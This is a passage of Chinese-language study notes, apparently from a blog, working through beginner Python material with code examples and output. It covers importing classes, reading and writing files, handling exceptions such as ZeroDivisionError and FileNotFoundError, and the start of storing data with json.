class="keyword">elif</span> self.battery_size == <span class="number">85</span>:</span><br><span class="line">range = <span class="number">270</span></span><br><span class="line">message = <span class="string">"This car can go approximately "</span> + str(range)</span><br><span class="line">message += <span class="string">" miles on a full charge."</span></span><br><span class="line">print(message)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElectricCar</span><span class="params">(Car)</span>:</span></span><br><span class="line"><span class="string">"""模拟电动汽车的独特之处"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">初始化父类的属性，再初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">super().__init__(make, model,</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> ElectricCar</span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'model s'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.battery.battery_size=<span class="number">70</span></span><br><span class="line">my_tesla.battery.describe_battery()</span><br><span class="line">my_tesla.battery.get_range()</span><br></pre></td></tr></table></figure><p><code>2016 Tesla Model S</code><br><code>This car has a 70-kWh battery.</code><br><code>This car can go approximately 240 miles on a full charge.</code></p><p><strong>从一个模块中导入多个类</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car, ElectricCar</span><br><span class="line">my_beetle = Car(<span class="string">'volkswagen'</span>, <span class="string">'beetle'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_beetle.get_descriptive_name())</span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'roadster'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure><p><code>2016 Volkswagen Beetle</code><br><code>2016 Tesla Roadster</code></p><p><strong>导入整个模块</strong><br>你还可以导入整个模块，再使用句点表示法访问需要的类。这种导入方法很简单，代码也易于阅读。由于创建类实例的代码都包含模块名，因此不会与当前文件使用的任何名称发生冲突。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> car</span><br><span class="line">my_beetle = car.Car(<span class="string">'volkswagen'</span>, <span class="string">'beetle'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_beetle.get_descriptive_name())</span><br><span class="line">my_tesla = car.ElectricCar(<span class="string">'tesla'</span>, <span class="string">'roadster'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></p><p><code>2016 Volkswagen Beetle</code><br><code>2016 Tesla Roadster</code></p><p><strong>导入模块中的所有类</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></p><p>不推荐使用这种导入方式，其原因有二。首先，如果只要看一下文件开头的import 语句，就能清楚地知道程序使用了哪些类，将大有裨益；但这种导入方式没有明确地指出你使用了模块中的哪些类。这种导入方式还可能引发名称方面的困惑。如果你不小心导入了一个与程序文件中其他东西同名的类，将引发难以诊断的错误。这里之所以介绍这种导入方式，是因为虽然不推荐使用这种方式，但你可能会在别人编写的代码中见到它。<br>需要从一个模块中导入很多类时，最好导入整个模块，并使用 module_name.class_name 语法来访问类。这样做时，虽然文件开头并没有列出用到的所有类，但你清楚地知道在程序的哪些地方使用了导入的模块；你还避免了导入模块中的每个类可能引发的名称冲突。</p><p><strong>在一个模块中导入另一个模块</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car</span><br><span class="line"><span class="keyword">from</span> electric_car <span class="keyword">import</span> ElectricCar</span><br><span class="line">my_beetle = Car(<span class="string">'volkswagen'</span>, <span class="string">'beetle'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_beetle.get_descriptive_name())</span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'roadster'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></p><p><code>2016 Volkswagen Beetle</code><br><code>2016 Tesla Roadster</code></p><p><strong>自定义工作流程</strong></p><p>，在组织大型项目的代码方面，Python提供了很多选项。熟悉所有这些选项很重要，这样你才能确定哪种项目组织方式是最佳的，并能理解别人开发的项目。<br>一开始应让代码结构尽可能简单。先尽可能在一个文件中完成所有的工作，确定一切都能正确运行后，再将类移到独立的模块中。如果你喜欢模块和文件的交互方式，可在项目<br>开始时就尝试将类存储到模块中。先找出让你能够编写出可行代码的方式，再尝试让代码更为组织有序。</p><p><strong>Python标准库</strong></p><p>Python标准库 是一组模块，安装的Python都包含它。你现在对类的工作原理已有大致的了解，可以开始使用其他程序员编写好的模块了。可使用标准库中的任何函数和类，为此只需在程序开头包含一条简单的import 语句。</p><p><strong>类编码风格</strong></p><p>类名应采用驼峰命名法 ，即将类名中的每个单词的首字母都大写，而不使用下划线。实例名和模块名都采用小写格式，并在单词之间加上下划线。<br>对于每个类，都应紧跟在类定义后面包含一个文档字符串。这种文档字符串简要地描述类的功能，并遵循编写函数的文档字符串时采用的格式约定。每个模块也都应包含一个文档字符串，对其中的类可用于做什么进行描述。<br>可使用空行来组织代码，但不要滥用。在类中，可使用一个空行来分隔方法；而在模块中，可使用两个空行来分隔类。<br>需要同时导入标准库中的模块和你编写的模块时，先编写导入标准库模块的import 语句，再添加一个空行，然后编写导入你自己编写的模块的import 语句。在包含多条import 语句的程序中，这种做法让人更容易明白程序使用的各个模块都来自何方。</p><h2 id="文件和异常"><a href="#文件和异常" class="headerlink" title="文件和异常"></a>文件和异常</h2><p><strong>从文件中读取数据</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'pi_digits.txt'</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.read()</span><br><span class="line">    print(contents.rstrip())</span><br></pre></td></tr></table></figure></p><p><strong>文件路径</strong></p><p>使用<strong>相对文件路</strong>径来打开该文件夹中的文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'text_files/filename.txt'</span>) <span class="keyword">as</span> file_object:</span><br></pre></td></tr></table></figure></p><p>当前文件夹下的文件去寻找</p><p>将文件在计算机中的准确位置告诉Python，这样就不用关心当前运行的程序存储在什么地方了。这称为绝对文件路径 。在Linux和OS X中，绝对路径类似于下面这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">'/home/ehmatthes/other_files/text_files/filename.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(file_path) <span class="keyword">as</span> file_object:</span><br></pre></td></tr></table></figure></p><p>而在Windows系统中，它们类似于下面这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">'C:\Users\ehmatthes\other_files\text_files\filename.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(file_path) <span class="keyword">as</span> file_object:</span><br></pre></td></tr></table></figure></p><p><strong>逐行读取</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'pi_digits.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file_object:</span><br><span class="line">        print(line.rstrip())</span><br></pre></td></tr></table></figure><p><code>3.1415926535</code><br><code>8979323846</code><br><code>2643383279</code></p><p><strong>创建一个包含文件各行内容的列表</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'pi_digits.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        print(line.rstrip())</span><br></pre></td></tr></table></figure></p><p><code>3.1415926535</code><br><code>8979323846</code><br><code>2643383279</code><br>方法readlines() 从文件中读取每一行，并将其存储在一个列表中；接下来，该列表被存储到变量lines 中；在with 代码块外，我们依然可以使用这个变量。</p><p><strong>使用文件的内容</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'pi_digits.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">pi_string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    pi_string += line.rstrip()</span><br><span class="line">print(pi_string)</span><br><span class="line">print(len(pi_string))</span><br><span class="line">type(pi_string)</span><br></pre></td></tr></table></figure></p><p><code>3.141592653589793238462643383279</code><br><code>32</code><br><code>str</code></p><p>rstrip和strip是python字符串中的方法。不知道你问的是不是字符串的方法。<br>　　rstrip函数返回字符串副本，该副本是从字符串最右边删除了参数指定字符后的字符串，不带参数进去则是去除最右边的空格。<br>　　而strip方法和rstrip的功能一样，不同之处是它是同时去除左右两边指定的字符。<br>　　<br>读取文本文件时，Python将其中的所有文本都解读为字符串。如果你读取的是数字，并要将其作为数值使用，就必须使用函数int() 将其转换为整数，或使用函数float() 将其转换为浮点数。</p><p><strong>包含一百万位的大型文件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'pi_million_digits.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">pi_string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    pi_string += line.strip()</span><br><span class="line">print(pi_string[:<span class="number">52</span>] + <span class="string">"..."</span>)</span><br><span class="line">print(len(pi_string))</span><br></pre></td></tr></table></figure><p><strong>圆周率值中包含你的生日吗</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'pi_million_digits.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">    pi_string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    pi_string += line.rstrip()</span><br><span class="line">birthday = input(<span class="string">"Enter your birthday, in the form mmddyy: "</span>)</span><br><span class="line"><span class="keyword">if</span> birthday <span class="keyword">in</span> pi_string:</span><br><span class="line">    print(<span class="string">"Your birthday appears in the first million digits of pi!"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Your birthday does not appear in the first million digits of pi."</span>)</span><br></pre></td></tr></table></figure></p><p><code>Enter your birthday, in the form mmddyy: 012590</code><br><code>Your birthday appears in the first million digits of pi!</code></p><p><strong>写入文件</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'programming.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">"I love programming."</span>)</span><br></pre></td></tr></table></figure></p><p>调用open() 时提供了两个实参。第一个实参也是要打开的文件的名称；第二个实参（’w’ ）告诉Python，我们要以写入模式 打开这个文件。打开文件时，可指定读取模式 （’r’ ）、写入模式 （’w’ ）、附加模式 （’a’ ）或让你能够读取和写入文件的模式（’r+’ ）。如果你省略了模式实参，Python将以默认的只读模式打开文件。<br>如果你要写入的文件不存在，函数open() 将自动创建它。然而，以写入（’w’ ）模式打开文件时千万要小心，因为如果指定的文件已经存在，Python将在返回文件对象前清空该文件。<br>我们使用文件对象的方法write() 将一个字符串写入文件。这个程序没有终端输出，但如果你打开文件programming.txt，将看到其中包含如下一行内容：<br><code>I love programming.</code><br>　Python只能将字符串写入文本文件。要将数值数据存储到文本文件中，必须先使用函数str() 将其转换为字符串格式。<br>　<br><strong>写入多行</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'programming.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">"I love programming.\n"</span>)</span><br><span class="line">    file_object.write(<span class="string">"I love creating new games.\n"</span>)</span><br></pre></td></tr></table></figure></p><p><strong>附加到文件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'programming.txt'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'a'</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">"I also love finding meaning in large datasets.\n"</span>)</span><br><span class="line">    file_object.write(<span class="string">"I love creating apps that can run in a browser.\n"</span>)</span><br></pre></td></tr></table></figure><p><code>I love programming.</code><br><code>I love creating new games.</code><br><code>I also love finding meaning in large datasets.</code><br><code>I love creating apps that can run in a browser.</code></p><p><strong>异常</strong></p><p>Python使用被称为异常 的特殊对象来管理程序执行期间发生的错误。每当发生让Python不知所措的错误时，它都会创建一个异常对象。如果你编写了处理该异常的代码，程序将继续运行；如果你未对异常进行处理，程序将停止，并显示一个traceback，其中包含有关异常的报告。<br>异常是使用try-except 代码块处理的。try-except 代码块让Python执行指定的操作，同时告诉Python发生异常时怎么办。使用了try-except 代码块时，即便出现异常，程序也将继续运行：显示你编写的友好的错误消息，而不是令用户迷惑的traceback。</p><p><strong>处理ZeroDivisionError 异常</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="number">5</span>/<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">ZeroDivisionError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-27</span>-fad870a50e27&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 print(5/0)</span><br><span class="line"></span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p><strong>使用try-except 代码块</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="number">5</span>/<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    print(<span class="string">"You can't divide by zero!"</span>)</span><br></pre></td></tr></table></figure><p><code>You can&#39;t divide by zero!</code><br>其中指定的错误与引发的错误相同。在这个示例中，try 代码块中的代码引发了ZeroDivisionError 异常，因此Python指出了该如何解决问题的except 代码块，并运行其中的代码。这样，用户看到的是一条友好的错误消息，而不是traceback：</p><p><strong>使用异常避免崩溃</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Give me two numbers, and I'll divide them."</span>)</span><br><span class="line">print(<span class="string">"Enter 'q' to quit."</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    first_number = input(<span class="string">"\nFirst number: "</span>)</span><br><span class="line">    <span class="keyword">if</span> first_number == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    second_number = input(<span class="string">"Second number: "</span>)</span><br><span class="line">    <span class="keyword">if</span> second_number == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    answer = int(first_number) / int(second_number)</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Give me two numbers, and I&apos;ll divide them.</span><br><span class="line">Enter &apos;q&apos; to quit.</span><br><span class="line"></span><br><span class="line">First number: 5</span><br><span class="line">Second number: 0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">ZeroDivisionError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input-29-2d52e39c3fbf&gt; in &lt;module&gt;()</span><br><span class="line">      8     if second_number == &apos;q&apos;:</span><br><span class="line">      9         break</span><br><span class="line">---&gt; 10     answer = int(first_number) / int(second_number)</span><br><span class="line">     11     print(answer)</span><br><span class="line"></span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p><strong>else 代码块</strong><br>通过将可能引发错误的代码放在try-except 代码块中，可提高这个程序抵御错误的能力。错误是执行除法运算的代码行导致的，因此我们需要将它放到try-except 代码块中。这个示例还包含一个else 代码块；依赖于try 代码块成功执行的代码都应放到else 代码块中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Give me two numbers, and I'll divide them."</span>)</span><br><span class="line">print(<span class="string">"Enter 'q' to quit."</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    first_number = input(<span class="string">"\nFirst number: "</span>)</span><br><span class="line">    <span class="keyword">if</span> first_number == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    second_number = input(<span class="string">"Second number: "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        answer = int(first_number) / int(second_number)</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        print(<span class="string">"You can't divide by 0!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(answer)</span><br></pre></td></tr></table></figure></p><p>我们让Python尝试执行try 代码块中的除法运算，这个代码块只包含可能导致错误的代码。依赖于try 代码块成功执行的代码都放在else 代码块中；在这个示例中，如果除法运算成功，我们就使用else 代码块来打印结果。<br>except 代码块告诉Python，出现ZeroDivisionError 异常时该怎么办（见❷）。如果try 代码块因除零错误而失败，我们就打印一条友好的消息，告诉用户如何避免这种错误。程序将继续运行，用户根本看不到traceback：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Give me two numbers, and I&apos;ll divide them.</span><br><span class="line">Enter &apos;q&apos; to quit.</span><br><span class="line"></span><br><span class="line">First number: 5</span><br><span class="line">Second number: 0</span><br><span class="line">You can&apos;t divide by 0!</span><br><span class="line"></span><br><span class="line">First number: 3</span><br><span class="line">Second number: 4</span><br><span class="line">0.75</span><br><span class="line"></span><br><span class="line">First number:</span><br></pre></td></tr></table></figure><p>try-except-else 代码块的工作原理大致如下：Python尝试执行try 代码块中的代码；只有可能引发异常的代码才需要放在try 语句中。有时候，有一些仅在try 代码块成功执行时才需要运行的代码；这些代码应放在else 代码块中。except 代码块告诉Python，如果它尝试运行try 代码块中的代码时引发了指定的异常，该怎么办。<br>通过预测可能发生错误的代码，可编写健壮的程序，它们即便面临无效数据或缺少资源，也能继续运行，从而能够抵御无意的用户错误和恶意的攻击。</p><p><strong>处理FileNotFoundError 异常</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;alice.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">with open(filename) as f_obj:</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: &apos;alice.txt&apos;</span><br></pre></td></tr></table></figure><p>在上述traceback中，最后一行报告了FileNotFoundError 异常，这是Python找不到要打开的文件时创建的异常。在这个示例中，这个错误是函数open() 导致的，因此要处理这个错误，必须将try 语句放在包含open() 的代码行之前：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'alice.txt'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        contents = f_obj.read()</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    msg = <span class="string">"Sorry, the file "</span> + filename + <span class="string">" does not exist."</span></span><br><span class="line">    print(msg)</span><br></pre></td></tr></table></figure></p><p><strong>分析文本</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'alice.txt'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        contents = f_obj.read()</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    msg = <span class="string">"Sorry, the file "</span> + filename + <span class="string">" does not exist."</span></span><br><span class="line">    print(msg)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># 计算文件大致包含多少个单词</span></span><br><span class="line">    words = contents.split()</span><br><span class="line">    num_words = len(words)</span><br><span class="line">    print(<span class="string">"The file "</span> + filename + <span class="string">" has about "</span> + str(num_words) + <span class="string">" words."</span>)</span><br></pre></td></tr></table></figure></p><p><code>The file alice.txt has about 29461 words.</code></p><p><strong>使用多个文件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_words</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="string">"""计算一个文件大致包含多少个单词"""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">            contents = f_obj.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        msg = <span class="string">"Sorry, the file "</span> + filename + <span class="string">" does not exist."</span></span><br><span class="line">        print(msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 计算文件大致包含多少个单词</span></span><br><span class="line">        words = contents.split()</span><br><span class="line">        num_words = len(words)</span><br><span class="line">        print(<span class="string">"The file "</span> + filename + <span class="string">" has about "</span> + str(num_words) +</span><br><span class="line">                <span class="string">" words."</span>)</span><br><span class="line">        </span><br><span class="line">filename = <span class="string">'alice.txt'</span></span><br><span class="line">count_words(filename)</span><br></pre></td></tr></table></figure><p><code>The file alice.txt has about 29461 words.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filenames = [<span class="string">'alice.txt'</span>, <span class="string">'siddhartha.txt'</span>, <span class="string">'moby_dick.txt'</span>, <span class="string">'little_women.txt'</span>]</span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">    count_words(filename)</span><br></pre></td></tr></table></figure><p><code>The file alice.txt has about 29461 words.</code><br><code>The file siddhartha.txt has about 42172 words.</code><br><code>The file moby_dick.txt has about 215136 words.</code><br><code>The file little_women.txt has about 189079 words.</code></p><p><strong>决定报告哪些错误</strong></p><p>在什么情况下该向用户报告错误？在什么情况下又应该在失败时一声不吭呢？如果用户知道要分析哪些文件，他们可能希望在有文件没有分析时出现一条消息，将其中的原因告诉他们。如果用户只想看到结果，而并不知道要分析哪些文件，可能就无需在有些文件不存在时告知他们。向用户显示他不想看到的信息可能会降低程序的可用性。Python的错误处理结构让你能够细致地控制与用户分享错误信息的程度，要分享多少信息由你决定。<br>编写得很好且经过详尽测试的代码不容易出现内部错误，如语法或逻辑错误，但只要程序依赖于外部因素，如用户输入、存在指定的文件、有网络链接，就有可能出现异常。凭借经验可判断该在程序的什么地方包含异常处理块，以及出现错误时该向用户提供多少相关的信息。</p><p><strong>存储数据</strong></p><p>，如让用户存储游戏首选项或提供要可视化的数据。不管专注的是什么，程序都把用户提供的信息存储在列表和字典等数据结构中。用户关闭程序时，你几乎总是要保存他们提供的信息；一种简单的方式是使用模块json 来存储数据。<br>模块json 让你能够将简单的Python数据结构转储到文件中，并在程序再次运行时加载该文件中的数据。你还可以使用json 在Python程序之间分享数据。更重要的是，JSON数据格式并非Python专用的，这让你能够将以JSON格式存储的数据与使用其他编程语言的人分享。这是一种轻便格式，很有用，也易于学习。<br><strong>注意</strong>JSON（JavaScript Object Notation）格式最初是为JavaScript开发的，但随后成了一种常见格式，被包括Python在内的众多语言采用。</p><p><strong>使用json.dump() 和json.load()</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">numbers = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line">filename = <span class="string">'numbers.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers, f_obj)</span><br></pre></td></tr></table></figure></p><p>我们先导入模块json 